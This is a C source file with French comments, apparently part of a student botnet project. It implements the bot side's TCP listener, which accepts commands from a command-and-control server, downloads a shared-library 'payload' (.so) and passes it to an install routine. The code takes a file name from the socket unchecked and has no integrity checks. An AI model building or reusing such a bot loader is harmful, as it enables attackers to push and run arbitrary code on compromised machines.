
#include "ecoute_tcp.h"

/**
 * void gestionClientTCP(void *s)
 * Fonction qui reçoi le msg envoyée par le CC (qui deviendra un ordre plus tard)
 * elle le reçoit et le printf
 * param pointeur vers la socket TCP
 */

void gestionClientTCP(void *s)
{
    printf("[gestionClientTCP]Start\n");
    char msg_recu[80];
    int socket = *((int *)s);
    /* Obtient une structure de fichier */
    FILE *dialogue = fdopen(socket, "a+");
    //ProcessDialog(socket);
    receiveTCP(socket, msg_recu, sizeof(msg_recu));
    printf("[gestionClientTCP]Le msg que j'ai lu de mon client TCP est : %s\n", msg_recu);
    if (dialogue == NULL)
    {
        perror("gestionClientTCP.fdopen");
        exit(EXIT_FAILURE);
    }
    fclose(dialogue);
    return;
}
/**
 * void recvFile(void *s)
 * Fonction qui reçoi le fichier.so envoyé par le CC
 * elle le receptionne et le crée dans son dossier
 * param pointeur vers la socket TCP
 */
void recvFile(void *s)
{
    //TODO : Il faut que recvFile prenne un pointeur de filename
    int socket_tcp = *((int *)s);
    char buff[BUFSIZ]; // to store file from client
    char file_size[256];
    char file_name[TAILLE_FILENAME];
    ssize_t len;
    FILE *fp;
    //Todo : Ce filename doit être recu par la socket
    strcpy(file_name, "example.so");
    fp = fopen("example.so", "w"); // stores the file content in start in the program directory
    if (fp == NULL)
    {
        printf("Error IN Opening File\n");
        return;
    }

    //Recoit le nom de la charge utile
    //TODO : Gérer les retours d'erreur
    recv(socket_tcp, file_name, TAILLE_FILENAME, 0);
    // if(erreur)
    //     appel fonction erreur

    //Recoit la taille du fichier
    //Postulat de départ : Ce truc fonctionne
    recv(socket_tcp, file_size, sizeof(file_size), 0);
    int remain_data = atoi(file_size);
    printf("[BOT] file size received is: %d\n", remain_data);

    //https://stackoverflow.com/questions/11952898/c-send-and-receive-file
    while ((remain_data > 0) && ((len = recv(socket_tcp, buff, BUFSIZ, 0)) > 0))
    {
        fwrite(buff, sizeof(char), len, fp);
        remain_data -= len;
        printf("Receive %ld bytes and we hope :- %d bytes\n", len, remain_data);
    }
    fclose(fp);
    close(socket_tcp);

    //Changer, mettre une condition sur le printf, c'est pas parce que on est
    //arrivé ici que forcément le fichier est bien recu
    printf("File received successfully !! \n");
    printf("New File created is start !! \n");

    //  Copier dans /usr/local/lib

    printf("La charge utile %s a bien été installée ! \n", file_name);

    install_charge(file_name);
}
/**
 * void nouveauClient(int dialogue)
 * Fonction wrapper qui lance un thread avec la fct de traitement TCP
 * param socket de dialogue 
*/
void nouveauClient(int dialogue)
{
    printf("[nouveauClient]Start\n");
    if (lanceThread(receive_cmd_TCP, (void *)&dialogue, sizeof(dialogue)) < 0)
    {
        perror("nouveauClient.lanceThread");
        exit(-1);
    }
}
/**
 * void TCP(void *arg)
 * Fonction wrapper qui initialise une socket tcp et lance boucle Serveur TCP dans un thread
 * 
 * 
 */
void TCP(void *arg)
{
    (void)arg;
    printf("############ Partie TCP ############\n");
    char port_s[6] = PORT_TCP_SERVEUR;
    int socket_tcp;
    // Initialisation du serveur
    socket_tcp = initialisationServeurTCP(port_s);
    if (socket_tcp < 0)
    {
        fprintf(stderr, "Initialisation du serveur impossible\n");
        exit(-1);
    }

    //Lancement de la boucle d'ecoute
    if (boucleServeurTCP(socket_tcp, nouveauClient) < 0)
    {
        fprintf(stderr, "Connexion avec le client impossible\n");
        exit(-1);
    }
}
/**
 * void partie_tcp()
 * Fonction wrapper qui initialise le serveur TCP dans un thread
 * 
 */
void partie_tcp()
{
    if (lanceThread(TCP, (void *)NULL, 0) < 0)
    {
        perror("boucleServeur.lanceThread");
        exit(-1);
    }
}